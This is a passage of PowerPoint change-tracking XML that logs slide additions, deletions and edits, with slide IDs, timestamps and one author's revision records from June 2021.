        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="311612657" sldId="494"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3933795559" sldId="495"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="684404787" sldId="496"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3211001472" sldId="497"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1035595462" sldId="498"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1984385075" sldId="499"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3318379012" sldId="500"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2125122821" sldId="501"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="198983510" sldId="502"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="686110812" sldId="503"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3430879985" sldId="504"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1270554279" sldId="505"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="951356934" sldId="506"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1385115538" sldId="507"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="494372939" sldId="508"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2058254067" sldId="509"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}"/>
    <pc:docChg chg="undo redo custSel addSld delSld modSld sldOrd">
      <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T14:32:54.680" v="2383" actId="114"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1325061211" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-25T22:29:38.709" v="54" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2201572609" sldId="257"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-26T00:55:36.178" v="1173" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="450669007" sldId="258"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:53:30.358" v="1663" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2789471632" sldId="392"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3672303902" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2467691949" sldId="394"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1030962794" sldId="395"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1635951812" sldId="396"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:53:30.358" v="1663" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3476957671" sldId="397"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="837580508" sldId="398"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="775249280" sldId="399"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="614667185" sldId="400"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3582893092" sldId="401"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="819433619" sldId="402"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="39788097" sldId="403"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3665038014" sldId="404"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="464350271" sldId="405"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2093752077" sldId="406"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1972666229" sldId="407"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2980641166" sldId="408"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3277870470" sldId="409"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add del mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2489270501" sldId="411"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3881480386" sldId="413"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3118374455" sldId="414"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="214186708" sldId="415"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4266318337" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1453023660" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4247754591" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1871513867" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-25T22:38:18.838" v="191" actId="680"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4105834762" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4160866766" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1090587346" sldId="421"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2079099636" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1881823739" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new del mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-26T00:55:30.187" v="1172" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1470109627" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3519466523" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2940456927" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3876190788" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod ord chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:12:15.231" v="1756"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2709397411" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="647302650" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="878272104" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4091828154" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T12:23:44.642" v="2091" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="593614233" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:54:00.122" v="1673" actId="6264"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="996485528" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T00:53:59.629" v="1671" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="848404907" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod ord modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:12:15.231" v="1756"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2829655940" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod ord modClrScheme chgLayout">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:40:40.036" v="1917" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3752964083" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:41:00.419" v="1944" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3503932430" sldId="436"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:41:16.603" v="1962" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1984469485" sldId="437"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:42:20.128" v="1966" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4198334412" sldId="438"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod modNotesTx">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{2DF50834-70B7-4792-8287-7E44FACC55EB}" dt="2021-06-27T01:45:55.971" v="1971" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
